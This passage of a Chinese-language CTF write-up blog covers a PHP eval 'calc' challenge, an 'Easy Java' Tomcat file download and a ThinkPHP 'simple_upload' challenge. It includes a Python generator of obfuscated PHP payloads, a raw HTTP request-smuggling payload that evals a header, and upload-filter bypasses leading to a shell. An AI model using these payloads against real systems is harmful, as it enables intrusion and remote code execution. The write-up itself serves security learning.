class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h4 id="解法一-肝就完事"><a href="#解法一-肝就完事" class="headerlink" title="解法一 肝就完事"></a>解法一 肝就完事</h4><p>强行绕过限制</p>
<p>关键:<code>((10000000000000).(0))&#123;3&#125;</code>=&gt;E</p>
<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">arr=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((0).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((1).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;2&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((2).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;3&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((3).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;4&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((4).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;5&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((5).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;6&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((6).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;7&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((7).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;8&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((8).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;9&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((9).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;-&quot;</span>: <span class="string">&quot;((-1).(0))&#123;0&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.&quot;</span> :<span class="string">&quot;((1.1).(0))&#123;1&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;E&quot;</span>: <span class="string">&quot;((10000000000000000000).(1))&#123;3&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;p&quot;</span>:<span class="string">&quot;((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$&quot;</span>:<span class="string">&quot;((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;l&quot;</span>:<span class="string">&quot;((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;))|(~((0).(0))&#123;0&#125;)&amp;~((~((8).(0))&#123;0&#125;)&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;H&quot;</span>: <span class="string">&quot;(~((0).(0))&#123;0&#125;)&amp;~((~((8).(0))&#123;0&#125;)&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Z&quot;</span> : <span class="string">&quot;(~(((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;))))&amp;(~((~(((8).(0))&#123;0&#125;))&amp;((~(((2).(0))&#123;0&#125;))&amp;(~(((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;)))))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;v&quot;</span> :<span class="string">&quot;(((2).(0))&#123;0&#125;)|((~((1).(0))&#123;0&#125;)&amp;((10000000000000000000).(1))&#123;3&#125;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;D&quot;</span> :<span class="string">&quot;(~((1).(0))&#123;0&#125;)&amp;((10000000000000000000).(1))&#123;3&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;A&quot;</span> :<span class="string">&quot;(~((2).(0))&#123;0&#125;)&amp;(~((~((1).(0))&#123;0&#125;)&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;P&quot;</span> :<span class="string">&quot;(~((1.1).(0))&#123;1&#125;)&amp;((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;O&quot;</span> :<span class="string">&quot;(~((0).(0))&#123;0&#125;)&amp;(~((~((8).(0))&#123;0&#125;)&amp;((~((2).(0))&#123;0&#125;)&amp;(~((10000000000000000000).(1))&#123;3&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;S&quot;</span> :<span class="string">&quot;(~((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;)))&amp;(~((~((2).(0))&#123;0&#125;)&amp;(~((10000000000000000000).(1))&#123;3&#125;)))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;U&quot;</span> :<span class="string">&quot;(((10000000000000000000).(1))&#123;3&#125;)|((~((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;)))&amp;(~((~((1).(0))&#123;0&#125;)&amp;(~((1.1).(0))&#123;2&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_&quot;</span> :<span class="string">&quot;((10000000000000000000).(1))&#123;3&#125;|(((~((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;)))&amp;(~((~((1).(0))&#123;0&#125;)&amp;(~((1.1).(0))&#123;1&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;T&quot;</span> :<span class="string">&quot;(~(((1).(0))&#123;0&#125;&amp;(~((2).(0))&#123;0&#125;)))&amp;(~((~((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(0))&#123;0&#125;&amp;(~((1.1).(0))&#123;1&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;I&quot;</span> :<span class="string">&quot;(~(((0).(0))&#123;0&#125;))&amp;(~((~((8).(0))&#123;0&#125;)&amp;((~((1).(0))&#123;0&#125;)&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;))))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;N&quot;</span> :<span class="string">&quot;(~((0).(0))&#123;0&#125;)&amp;(~((~((8).(0))&#123;0&#125;)&amp;((~(((2).(0))&#123;0&#125;))&amp;(~((~((1).(0))&#123;0&#125;)&amp;((10000000000000000000).(1))&#123;3&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;f&quot;</span> :<span class="string">&quot;((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;))|((~(((4).(0))&#123;0&#125;))&amp;(~((~(((2).(0))&#123;0&#125;))&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;))))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;B&quot;</span> :<span class="string">&quot;(~(((4).(0))&#123;0&#125;))&amp;(~((~(((2).(0))&#123;0&#125;))&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;r&quot;</span> :<span class="string">&quot;(~((~(((2).(0))&#123;0&#125;))&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;[&quot;</span> :<span class="string">&quot;(~(((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;))))&amp;(~((~((8).(0))&#123;0&#125;)&amp;((~(((2).(0))&#123;0&#125;))&amp;(~(((10000000000000000000).(1))&#123;3&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;]&quot;</span> :<span class="string">&quot;(((10000000000000000000).(1))&#123;3&#125;)|((((8).(0))&#123;0&#125;)&amp;(~(((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;C&quot;</span>:<span class="string">&quot;(~(((4).(0))&#123;0&#125;))&amp;(~((~(((2).(0))&#123;0&#125;))&amp;(~(((10000000000000000000).(1))&#123;3&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;M&quot;</span>:<span class="string">&quot;(~(((0).(0))&#123;0&#125;))&amp;(~((~(((8).(0))&#123;0&#125;))&amp;(~(((10000000000000000000).(1))&#123;3&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;\\&quot;</span>:<span class="string">&quot;(~(((((1).(0))&#123;0&#125;))&amp;(~(((2).(0))&#123;0&#125;)))&amp;~((~(((10000000000000000000).(1))&#123;3&#125;))&amp;~((((8).(0))&#123;0&#125;)&amp;(~(((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;)))))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;/&quot;</span>:<span class="string">&quot;((((1.1).(0))&#123;1&#125;)|(((-1).(0))&#123;0&#125;))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;G&quot;</span>:<span class="string">&quot;(~(((8).(0))&#123;0&#125;))&amp;(~((~(((2).(0))&#123;0&#125;))&amp;(~(((10000000000000000000).(1))&#123;3&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g&quot;</span>:<span class="string">&quot;(((10000000000000000000).(1))&#123;3&#125;)|((((2).(0))&#123;0&#125;)&amp;(((1.1).(0))&#123;1&#125;))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;a&quot;</span>:<span class="string">&quot;((((1).(0))&#123;0&#125;)&amp;((~((2).(0))&#123;0&#125;)))|((((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;)))&amp;(~((((1).(0))&#123;0&#125;)&amp;(~(((1.1).(0))&#123;1&#125;)))))&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">s=<span class="string">&quot;scandir&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">topayload</span>(<span class="params">s</span>):</span></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span>(i <span class="keyword">in</span> arr):</span><br><span class="line">            result+=(<span class="string">&quot;(&quot;</span>+arr[i]+<span class="string">&quot;)&quot;</span>+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span>(i.upper() <span class="keyword">in</span> arr):</span><br><span class="line">            result+=(<span class="string">&quot;(&quot;</span>+arr[i.upper()]+<span class="string">&quot;)&quot;</span>+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span>(i.lower() <span class="keyword">in</span> arr):</span><br><span class="line">            result+=(<span class="string">&quot;(&quot;</span>+arr[i.lower()]+<span class="string">&quot;)&quot;</span>+<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> result[:-<span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tomethod</span>(<span class="params">meth,para,c=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> c:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span>+topayload(meth)+<span class="string">&quot;)(&quot;</span>+topayload(para)+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span>+topayload(meth)+<span class="string">&quot;)(&quot;</span>+(para)+<span class="string">&quot;)&quot;</span></span><br><span class="line"><span class="comment"># print(tomethod(&quot;var_dump&quot;,tomethod(&quot;scandir&quot;,&quot;/&quot;),False))</span></span><br><span class="line"><span class="built_in">print</span>(tomethod(<span class="string">&quot;var_dump&quot;</span>,tomethod(<span class="string">&quot;file&quot;</span>,<span class="string">&quot;/f1agg&quot;</span>),<span class="literal">False</span>))</span><br><span class="line"><span class="comment"># print(tomethod(&quot;file_get_contents&quot;,&quot;/f1agg&quot;))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="解法二-HTTP走私"><a href="#解法二-HTTP走私" class="headerlink" title="解法二 HTTP走私"></a>解法二 HTTP走私</h4><p>http走私请看:<a target="_blank" rel="noopener" href="https://paper.seebug.org/1048/">https://paper.seebug.org/1048/</a></p>
<p>这题php禁用了<code> $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;反引号&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];</code></p>
<p>apache再禁用了字母和不可打印字符</p>
<p>后来看别人的wp知道了,虽然服务器返回400,但是还会将请求转发给后端,标准的http走私</p>
<p><img src="https://i.loli.net/2019/10/18/9YgzckxODPiNe6C.png" alt="image.png"></p>
<p>真几把神奇，刚看到http走私的时候我还以为是前后端对content-type的解析不同</p>
<p>结合getallheads来绕过php字符限制</p>
<p>最后payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /calc.php?num=eval(end(getallheaders())); HTTP/1.1</span><br><span class="line">Host: node3.buuoj.cn:28023</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36</span><br><span class="line">Referer: http://node3.buuoj.cn:28023/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 422</span><br><span class="line">Content-Length: 0</span><br><span class="line">A: var_dump(file_get_contents(&quot;/f1agg&quot;));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h4 id="解法三-利用php字符串解析特性绕过apache-waf"><a href="#解法三-利用php字符串解析特性绕过apache-waf" class="headerlink" title="解法三 利用php字符串解析特性绕过apache waf"></a>解法三 利用php字符串解析特性绕过apache waf</h4><p>php字符串解析特性</p>
<p><img src="https://image.3001.net/images/20190904/1567560438_5d6f12f680afe.png!small"></p>
<p><img src="https://image.3001.net/images/20190904/1567560448_5d6f13004035f.png!small"></p>
<p>当我们发送这样一个请求是:<code>?%20num=123</code></p>
<p>apache的检查规则只能匹配到num,而这个请求在php却会被解析为$_GET[‘num’]最后成功绕过apache的waf</p>
<h3 id="Easy-Java"><a href="#Easy-Java" class="headerlink" title="Easy Java"></a>Easy Java</h3><p>扫目录发现一个Download,去登入界面查找一下download,发现<code>Download?filename=help.docx</code></p>
<p>可是无论下什么也不行,看了别人的wp发现post就可以233333</p>
<p>接下来就简单了,因为这是一个tomcat的网站</p>
<p>贴一个tomcat的结构图</p>
<p><img src="https://i.loli.net/2019/09/01/LduWtSfIh8bDA7Z.png"></p>
<p>先去查看一下WEB-INF/web.xml</p>
<p>发现</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>FlagController<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.wm.ctf.FlagController<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>于是去WEB-INF/classes/com/wm/ctf/FlagController.class</p>
<p>查看,发现一个base64编码的字符串</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g82oi6jxybj31240l2dj8.jpg" alt="image.png"></p>
<h3 id="simple-upload"><a href="#simple-upload" class="headerlink" title="simple_upload"></a>simple_upload</h3><h4 id="源码-1"><a href="#源码-1" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$uploadFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line">        <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> (strstr(strtolower(<span class="variable">$uploadFile</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$upload</span> = <span class="keyword">new</span> \Think\Upload();<span class="comment">// 实例化上传类</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;maxSize  = <span class="number">4096</span> ;<span class="comment">// 设置附件上传大小</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;allowExts  = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;gif&#x27;</span>, <span class="string">&#x27;png&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span>);<span class="comment">// 设置附件上传类型</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;rootPath = <span class="string">&#x27;./Public/Uploads/&#x27;</span>;<span class="comment">// 设置附件上传目录</span></span><br><span class="line">        <span class="variable">$upload</span>-&gt;savePath = <span class="string">&#x27;&#x27;</span>;<span class="comment">// 设置附件上传子目录</span></span><br><span class="line">        <span class="variable">$info</span> = <span class="variable">$upload</span>-&gt;upload() ;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$info</span>) &#123;<span class="comment">// 上传错误提示错误信息</span></span><br><span class="line">          <span class="keyword">$this</span>-&gt;error(<span class="variable">$upload</span>-&gt;getError());</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;<span class="comment">// 上传成功 获取上传文件信息</span></span><br><span class="line">          <span class="variable">$url</span> = __ROOT__.substr(<span class="variable">$upload</span>-&gt;rootPath,<span class="number">1</span>).<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savepath&#x27;</span>].<span class="variable">$info</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;savename&#x27;</span>] ;</span><br><span class="line">          <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(<span class="string">&quot;url&quot;</span>=&gt;<span class="variable">$url</span>,<span class="string">&quot;success&quot;</span>=&gt;<span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法一-thinkphp漏洞"><a href="#解法一-thinkphp漏洞" class="headerlink" title="解法一 thinkphp漏洞"></a>解法一 thinkphp漏洞</h4><p>利用<code>Think\Controller,\Think\Upload()</code> 等关键字查询到该thinkphp版本大致在3.2.x,这里我去找了3.2.3的源码</p>
<p>阅读文件上传部分代码发现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$files</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;&#x27;</span> === <span class="variable">$files</span>) &#123;</span><br><span class="line">            <span class="variable">$files</span> = <span class="variable">$_FILES</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    	.....</span><br><span class="line">           </span><br><span class="line">        <span class="variable">$files</span> = <span class="keyword">$this</span>-&gt;dealFiles(<span class="variable">$files</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>] = strip_tags(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$file</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$file</span>[<span class="string">&#x27;key&#x27;</span>] = <span class="variable">$key</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        ....</span><br><span class="line">	&#125;</span><br><span class="line">    ....</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里注意到有个strip_tags,查询文档<code>         从字符串中去除 HTML 和 PHP 标记</code></p>
<p>ok,成功找到绕过后缀名限制的方法</p>
<p><img src="http://ww1.sinaimg.cn/large/006pWR9agy1g82rhln3m6j31240l2whe.jpg" alt="image.png"></p>
<p>成功getflag美滋滋</p>
<h4 id="解法二-上传多个文件绕过后缀名检测"><a href="#解法二-上传多个文件绕过后缀名检测" class="headerlink" title="解法二  上传多个文件绕过后缀名检测"></a>解法二  上传多个文件绕过后缀名检测</h4><p>大佬们太强了/fad/fad</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="variable">$uploadFile</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>] ;</span><br><span class="line"><span class="keyword">if</span> (strstr(strtolower(<span class="variable">$uploadFile</span>[<span class="string">&#x27;name&#x27;</span>]), <span class="string">&quot;.php&quot;</span>) ) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>如果上传多个文件, $uploadFile内包含多个文件,<code>strstr(strtolower($uploadFile[&#39;name&#39;]), &quot;.php&quot;)</code>自然也就无效了,接下来就是获取文件名,就可以getshell,因为thinkphp文件名是递增的,所以也就很容易获取到想要的文件了</p>
